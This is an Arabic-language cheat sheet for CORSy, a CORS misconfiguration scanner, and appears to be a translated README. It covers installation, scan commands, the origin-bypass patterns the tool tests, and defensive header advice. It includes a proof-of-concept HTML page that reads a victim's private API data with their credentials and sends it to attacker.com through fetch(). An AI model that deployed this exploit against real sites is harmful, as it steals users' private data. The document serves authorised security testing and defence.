<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🌐 كورسي - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```
<p align="center">
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="أمان الويب">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</ص>

<p align="center">
  <b>🌐 أداة CLI سريعة وشاملة مصممة لاكتشاف التكوينات الخاطئة لمشاركة الموارد عبر الأصل (CORS) واختبار مخاطر سرقة البيانات عبر الأصل</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة وأساسيات ثغرات CORS](#-نظرة عامة--أساسيات ثغرات CORS)
  - [الثلاثي القاتل: انعكاس الأصل + صحة بيانات الاعتماد](#الثلاثي القاتل: انعكاس الأصل--أوراق الاعتماد-صحيح)
- [التثبيت](#-التثبيت)
- [المسح الأساسي للهدف](#-المسح الأساسي للهدف)
- [تم اختبار نواقل هجوم CORS](تم اختبار #-cors-attack-vectors)
  - [انعكاس الأصل التعسفي](#انعكاس الأصل التعسفي)
  - [الوثوق بالأصل الخالي (`Origin: null`)](#trusting-null-origin-origin-null)
  - [البادئة واللاحقة تجاوز Regex](#prefix--suffix-regex-bypass)
  - [Wildcard Subdomain Trust](#wildcard-subdomain-trust)
  - [تجاوز الأحرف الخاصة (`_`، `;`، `!`)](# تجاوز الأحرف الخاصة ----)
- [المسح متعدد الأهداف وتصدير المخرجات](#-المسح متعدد الأهداف--تصدير المخرجات)
- [صياغة برمجيات إكسبلويت لإثبات المفهوم (PoC)](#-crafting-proof-of-concept-poc-exploits)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والرؤوس الآمنة](#-الاعتبارات الدفاعية--الرؤوس الآمنة)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة وأساسيات ثغرات CORS

**مشاركة الموارد عبر المصادر (CORS)** هي آلية أمان للمتصفح تسمح لخوادم الويب بالاسترخاء في **سياسة المصدر نفسه (SOP)**. من خلال إرجاع الرؤوس مثل:
- `Access-Control-Allow-Origin: <origin>`
- `Access-Control-Allow-Credentials: true`

يمنح تطبيق الويب مواقع الويب الأخرى الإذن بقراءة استجابات HTTP الخاصة به نيابة عن المستخدم الضحية.

### الثلاثي القاتل: انعكاس الأصل + بيانات الاعتماد الحقيقية
عندما يعكس أحد التطبيقات بشكل أعمى رأس `Origin` الوارد في `Access-Control-Allow-Origin` ويمكّن `Access-Control-Allow-Credentials: true`، يمكن لأي موقع ويب ضار أن يجبر متصفح الزائر المعتمد على قراءة الرسائل الخاصة ومفاتيح API وتفاصيل الحساب.

تم إنشاؤها بواسطة **Somdev Sangwan (s0md3v)**، **CORSy** تقوم بشكل منهجي بالتحقيق في نقاط النهاية باستخدام أكثر من 16 تبديلًا أصليًا معروفًا لاكتشاف هذه التكوينات الخاطئة.

---

## 📥 التثبيت
```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```
---

## 🚀 المسح الأساسي للهدف

مسح نقطة نهاية تطبيق ويب واحد:
```bash
python3 corsy.py -u https://target.com/api/user/details
```
أضف رؤوسًا مخصصة أو ملفات تعريف ارتباط الجلسة:
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```
---

## ⚡ تم اختبار نواقل هجوم CORS

يقوم CORSy تلقائيًا باختبار العديد من أنماط التقليب الأصلية:

### انعكاس الأصل التعسفي
يعكس الخادم بشكل أعمى أي مجال:
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
### الثقة في الأصل الفارغ (`Origin: null`)
قد تثق التطبيقات في أصول `null` (شائعة مع إطارات iframe المحلية ذات وضع الحماية أو عناوين URL الخاصة بـ `data:`):
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*يمكن تشغيله عن طريق تحميل واجهة برمجة تطبيقات الضحية من إطار iframe باستخدام `sandbox="allow-scripts allow-top-navigation"`.*

### البادئة واللاحقة تجاوز Regex
ضعف التحقق من صحة التعبير العادي (مثل `.*target.com` أو `target.com.*`):
- `https://target.com.attacker.com`
- `https://not-target.com`

### تجاوز الأحرف الخاصة (`_`، `;`، `!`)
تتعامل المتصفحات والخوادم مع محددات URI بشكل مختلف:
-`https://target.com_.attacker.com`
-`https://target.com%60.attacker.com`

---

## 🌐 المسح متعدد الأهداف وتصدير المخرجات

قم بمسح قوائم كبيرة من نقاط نهاية واجهة برمجة التطبيقات (API) التي تم اكتشافها من خلال الاستطلاع:
```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```
---

## 💻 صياغة برمجيات إكسبلويت لإثبات المفهوم (PoC).

عندما تؤكد CORSy وجود خطأ في التكوين مع السماح ببيانات الاعتماد، قم بإنشاء استغلال HTML لسرقة البيانات الحساسة:
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```
---

## ⚡ جدول مرجعي سريع

| الهدف | الأمر |
|-----------|--------|
| ** مسح عنوان URL واحد ** | `python3 corsy.py -u <URL>` |
| **المسح الضوئي باستخدام ملف تعريف الارتباط للجلسة** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| ** قائمة عناوين URL للمسح ** | `python3 corsy.py -i targets.txt` |
| **مسح متعدد الخيوط** | `python3 corsy.py -i targets.txt -t 20` |
| **تصدير إلى JSON** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ الاعتبارات الدفاعية والضربات الرأسية الآمنة

1. **لا تعكس الأصل مطلقًا بشكل تعسفي:** قارن رأس `Origin` بقائمة بيضاء صارمة وصريحة من جانب الخادم.
2. ** لا تقم مطلقًا بإقران Wildcard مع بيانات الاعتماد: ** يحظر المتصفح `Access-Control-Allow-Origin: *` مع `Credentials: true`، ولكن لا يحاكيه أبدًا ديناميكيًا.
3. **تجنب الثقة في `null`:** لا تقم بإضافة `null` إلى سياسات الأصل الموثوقة.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> تم تصميم CORSy بشكل صارم للتقييمات الأمنية المعتمدة واختبار الاختراق والتدقيق الدفاعي. اختبار المواقع دون إذن غير قانوني.